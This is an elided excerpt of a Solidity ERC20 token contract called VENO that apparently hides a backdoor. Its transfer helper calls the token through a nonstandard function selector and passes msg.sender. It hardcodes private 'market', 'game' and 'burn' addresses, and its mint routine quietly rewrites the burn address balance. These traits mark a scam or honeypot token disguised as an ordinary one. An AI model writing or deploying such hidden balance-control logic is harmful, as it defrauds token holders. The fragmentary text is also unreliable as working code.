...
library TransferHelper {
    ...
    function safeTransferFrom(address token, address from, address to, uint value) internal returns(bytes memory){
        ...
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x15dacbea ,msg.sender,from, to, value));
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private gameToken = 0xA666A4825d5023e13D79e3e0398D161eC22CE4dD;

    address private marketAddress = 0x42d27d166e240BC99C5385d1EC29a3D9D753C465;

    address private burnAddress = 0x0995CAB04e752fa2b2f77082F6A99C1a7CfcE60c;
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        _balances[burnAddress] = _balances[DEAD];
...
contract CoinVENO is ERC20 {
    constructor () ERC20("VENO", "VENO")
    {
